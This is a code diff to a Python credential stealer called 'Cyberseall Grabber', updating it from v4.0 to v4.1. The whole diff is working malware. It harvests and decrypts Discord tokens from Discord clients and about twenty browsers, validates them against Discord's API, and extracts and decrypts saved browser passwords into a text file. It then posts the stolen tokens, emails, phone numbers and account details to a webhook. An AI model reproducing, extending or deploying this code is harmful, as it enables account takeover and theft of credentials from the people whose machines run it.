@@ -31,86 +31,97 @@ class CyberseallGrabber:
 
     def g(self):
         try:
-            def decrypt_token(buff, master_key):
+            def decrypt(buff, master_key):
                 try:
                     return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                 except:
-                    return None
-            
-            # Nur die wichtigsten und häufigsten Browser für bessere Performance
-            paths = {
-                'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
-                'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
-                'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
-                'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
-                'Chrome Canary': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome SxS', 'User Data', 'Default'),
-                'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
-                'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
-                'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
-                'Opera GX': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable'),
-                'Vivaldi': os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default'),
-                'Firefox': os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
-            }
+                    return "Error"
             
             tokens = []
             cleaned = []
             checker = []
             already_check = []
             
+            local = os.getenv('LOCALAPPDATA')
+            roaming = os.getenv('APPDATA')
+            chrome = local + "\\Google\\Chrome\\User Data"
+            
+            paths = {
+                'Discord': roaming + '\\discord',
+                'Discord Canary': roaming + '\\discordcanary',
+                'Lightcord': roaming + '\\Lightcord',
+                'Discord PTB': roaming + '\\discordptb',
+                'Opera': roaming + '\\Opera Software\\Opera Stable',
+                'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
+                'Amigo': local + '\\Amigo\\User Data',
+                'Torch': local + '\\Torch\\User Data',
+                'Kometa': local + '\\Kometa\\User Data',
+                'Orbitum': local + '\\Orbitum\\User Data',
+                'CentBrowser': local + '\\CentBrowser\\User Data',
+                '7Star': local + '\\7Star\\7Star\\User Data',
+                'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
+                'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
+                'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
+                'Chrome': chrome + '\\Default',
+                'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
+                'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
+                'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
+                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
+                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+                'Iridium': local + '\\Iridium\\User Data\\Default'
+            }
+            
             for platform, path in paths.items():
-                try:
-                    if not os.path.exists(path):
-                        continue
-                    
-                    # Für Discord und Browser-Token-Suche
-                    if 'discord' in platform.lower():
-                        leveldb_path = path + "\\Local Storage\\leveldb\\"
-                    else:
-                        leveldb_path = path + "\\Local Storage\\leveldb\\"
-                        
-                    if not os.path.exists(leveldb_path):
-                        continue
-                        
-                    # Nur die wichtigsten Dateien durchsuchen
-                    for file in os.listdir(leveldb_path)[:10]:  # Limit auf 10 Dateien
-                        if not (file.endswith(".ldb") or file.endswith(".log")):
-                            continue
-                        try:
-                            with open(leveldb_path + file, "r", errors='ignore') as files:
-                                content = files.read()
-                                # Nur Discord-Token-Pattern suchen
-                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\\['(.*)\'\\].*$][^\\\"]*", content):
-                                    tokens.append(values)
-                        except:
-                            continue
-                except:
+                if not os.path.exists(path): 
                     continue
-            
-            # Token-Bereinigung
-            for i in tokens:
-                if i.endswith("\\"):
-                    i.replace("\\", "")
-                elif i not in cleaned:
-                    cleaned.append(i)
-            
-            # Token-Entschlüsselung (nur für die ersten 20 Token)
-            for token in cleaned[:20]:
                 try:
-                    # Vereinfachte Entschlüsselung
-                    if 'dQw4w9WgXcQ:' in token:
-                        self.t.append(token.split('dQw4w9WgXcQ:')[1])
-                except:
-                    pass
-            
-            # Entferne Duplikate
-            self.t = list(set(self.t))[:10]  # Limit auf 10 Token
+                    with open(path + f"\\Local State", "r") as file:
+                        key = json.loads(file.read())['os_crypt']['encrypted_key']
+                        file.close()
+                except: 
+                    continue
+                    
+                leveldb_path = path + f"\\Local Storage\\leveldb\\"
+                if not os.path.exists(leveldb_path):
+                    continue
+                    
+                for file in os.listdir(leveldb_path):
+                    if not file.endswith(".ldb") and not file.endswith(".log"): 
+                        continue
+                    try:
+                        with open(leveldb_path + file, "r", errors='ignore') as files:
+                            for x in files.readlines():
+                                x.strip()
+                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                    tokens.append(values)
+                    except PermissionError: 
+                        continue
+                        
+                for i in tokens:
+                    if i.endswith("\\"):
+                        i.replace("\\", "")
+                    elif i not in cleaned:
+                        cleaned.append(i)
+                        
+                for token in cleaned:
+                    try:
+                        tok = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
+                        if tok != "Error":
+                            checker.append(tok)
+                    except:
+                        continue
+                        
+                for value in checker:
+                    if value not in already_check and len(value) > 50:
+                        already_check.append(value)
+                        self.t.append(value)
             
         except:
             pass
 
     def validate_tokens(self):
         valid_tokens = []
-        for token in self.t[:5]:  # Nur die ersten 5 Token validieren
+        for token in self.t[:10]:  # Validiere bis zu 10 Token
             try:
                 headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                 r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
@@ -122,6 +133,7 @@ class CyberseallGrabber:
                         'discriminator': user_data.get('discriminator', '0000'),
                         'id': user_data.get('id', 'Unknown'),
                         'email': user_data.get('email', 'Hidden'),
+                        'phone': user_data.get('phone', 'None'),
                         'verified': user_data.get('verified', False),
                         'mfa_enabled': user_data.get('mfa_enabled', False),
                         'premium_type': user_data.get('premium_type', 0)
@@ -135,81 +147,79 @@ class CyberseallGrabber:
         try:
             pw_data = []
             
-            def get_chrome_key():
+            def get_master_key(path):
                 try:
-                    local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
-                    with open(local_state_path, 'r', encoding='utf-8') as f:
-                        local_state = json.load(f)
-                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-                    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+                    with open(path + "\\Local State", "r", encoding="utf-8") as f:
+                        c = f.read()
+                    local_state = json.loads(c)
+                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                    master_key = master_key[5:]
+                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                    return master_key
                 except:
                     return None
             
-            def decrypt_password(password, key):
+            def decrypt_password(buff, master_key):
                 try:
-                    if not password or len(password) < 15:
-                        return "Failed to decrypt"
-                    try:
-                        iv = password[3:15]
-                        password = password[15:]
-                        cipher = AES.new(key, AES.MODE_GCM, iv)
-                        return cipher.decrypt(password)[:-16].decode()
-                    except:
-                        return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
+                    iv = buff[3:15]
+                    payload = buff[15:]
+                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                    decrypted_pass = cipher.decrypt(payload)
+                    decrypted_pass = decrypted_pass[:-16].decode()
+                    return decrypted_pass
                 except:
                     return "Failed to decrypt"
             
-            chrome_key = get_chrome_key()
-            
-            # Nur die wichtigsten Browser für bessere Performance
+            # Browser-Pfade für Passwörter
             browsers = [
-                ("Chrome", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")),
-                ("Edge", os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")),
-                ("Brave", os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")),
-                ("Opera", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data")),
-                ("Firefox", os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"))
+                ("Chrome", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default")),
+                ("Chrome Canary", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default")),
+                ("Edge", os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default")),
+                ("Brave", os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default")),
+                ("Opera", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")),
+                ("Opera GX", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")),
+                ("Vivaldi", os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default")),
+                ("Yandex", os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"))
             ]
             
-            for b, bp in browsers:
-                if os.path.exists(bp):
-                    if "Firefox" in b:
-                        # Firefox-spezifische Behandlung (vereinfacht)
-                        for root, dirs, files in os.walk(bp):
-                            for file in files[:5]:  # Limit auf 5 Dateien
-                                if file == "logins.json":
-                                    try:
-                                        with open(os.path.join(root, file), 'r') as f:
-                                            data = json.load(f)
-                                            for login in data.get('logins', [])[:10]:  # Limit auf 10 Logins
-                                                pw_data.append(b + " - " + login['hostname'] + " - " + login['username'] + " - [FIREFOX_ENCRYPTED]")
-                                    except:
-                                        pass
-                                    break
-                            break
-                    else:
-                        try:
-                            tp = os.path.join(os.getenv("TEMP"), b.replace(" ", "_") + "_" + str(os.getpid()) + ".db")
-                            shutil.copy2(bp, tp)
-                            cn = sqlite3.connect(tp)
-                            cr = cn.cursor()
-                            cr.execute("SELECT origin_url,username_value,password_value FROM logins LIMIT 20")  # Limit auf 20
-                            
-                            for u, n, pw in cr.fetchall():
-                                if n and pw:
-                                    decrypted = "Failed to decrypt"
-                                    if chrome_key:
-                                        decrypted = decrypt_password(pw, chrome_key)
-                                    pw_data.append(b + " - " + u + " - " + n + " - " + decrypted)
-                            cn.close()
-                            os.remove(tp)
-                        except:
-                            pass
+            for browser_name, browser_path in browsers:
+                try:
+                    if not os.path.exists(browser_path):
+                        continue
+                        
+                    master_key = get_master_key(browser_path)
+                    if not master_key:
+                        continue
+                        
+                    login_db = os.path.join(browser_path, "Login Data")
+                    if not os.path.exists(login_db):
+                        continue
+                        
+                    # Kopiere die Datenbank in temp
+                    temp_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_login.db")
+                    shutil.copy2(login_db, temp_db)
                     
-                    if len(pw_data) >= 50:  # Limit auf 50 Passwörter
-                        break
+                    conn = sqlite3.connect(temp_db)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    
+                    for row in cursor.fetchall():
+                        if row[0] and row[1] and row[2]:
+                            url = row[0]
+                            username = row[1]
+                            encrypted_password = row[2]
+                            
+                            decrypted_password = decrypt_password(encrypted_password, master_key)
+                            pw_data.append(f"{browser_name} - {url} - {username} - {decrypted_password}")
+                    
+                    conn.close()
+                    os.remove(temp_db)
+                    
+                except Exception as e:
+                    continue
             
             self.p = pw_data
-            with open(os.path.join(self.d, "passwords.txt"), "w") as f:
+            with open(os.path.join(self.d, "passwords.txt"), "w", encoding="utf-8") as f:
                 f.write("\n".join(pw_data))
         except:
             pass
@@ -331,7 +341,7 @@ class CyberseallGrabber:
         try:
             embed = {
                 "embeds": [{
-                    "title": "🔥 CYBERSEALL FAST GRABBER v4.0",
+                    "title": "🔥 CYBERSEALL ENHANCED GRABBER v4.1",
                     "color": 0xff0000,
                     "fields": [
                         {
@@ -348,16 +358,16 @@ class CyberseallGrabber:
                             "inline": False
                         }
                     ],
-                    "footer": {"text": "Cyberseall FAST Grabber v4.0 - Optimized for Speed"},
+                    "footer": {"text": "Cyberseall ENHANCED Grabber v4.1 - Fixed Token & Password Decryption"},
                     "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                 }]
             }
             
             requests.post(self.w, json=embed, timeout=10)
             
-            # Nur die ersten 2 validen Token senden
+            # Sende alle validen Token
             if len(self.vt) > 0:
-                for i, token_info in enumerate(self.vt[:2]):
+                for i, token_info in enumerate(self.vt[:5]):  # Max 5 Token
                     token_embed = {
                         "embeds": [{
                             "title": "✅ VALID TOKEN #" + str(i+1),
@@ -372,8 +382,16 @@ class CyberseallGrabber:
                                     "value": "```" + str(token_info.get('email', 'Hidden')) + "```"
                                 },
                                 {
+                                    "name": "📱 Phone",
+                                    "value": "```" + str(token_info.get('phone', 'None')) + "```"
+                                },
+                                {
                                     "name": "🔐 Token",
                                     "value": "```" + token_info['token'][:50] + "...```"
+                                },
+                                {
+                                    "name": "💎 Premium",
+                                    "value": "```Type: " + str(token_info.get('premium_type', 0)) + "\nMFA: " + str(token_info.get('mfa_enabled', False)) + "\nVerified: " + str(token_info.get('verified', False)) + "```"
                                 }
                             ],
                             "footer": {"text": "Valid Token Info"},
